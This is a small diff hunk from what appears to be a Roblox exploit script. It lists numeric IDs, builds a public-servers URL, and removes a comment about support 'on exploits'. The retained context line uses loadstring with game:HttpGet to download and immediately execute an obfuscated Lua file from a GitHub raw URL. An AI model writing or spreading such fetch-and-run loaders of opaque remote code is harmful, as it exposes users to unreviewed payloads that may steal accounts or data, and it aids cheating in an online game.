@@ -5,7 +5,6 @@ local HTTPService = game:GetService("HttpService")
 local allowedList = {"1676987923","3153706378","3152069224","345868431","839916604","333176446","57025672","2410515233"}
 local webLink = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
 
- -- dk if task library is supported on exploits as i dont exploit
  -- if not replace task.wait with wait()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
 wait(0.5)
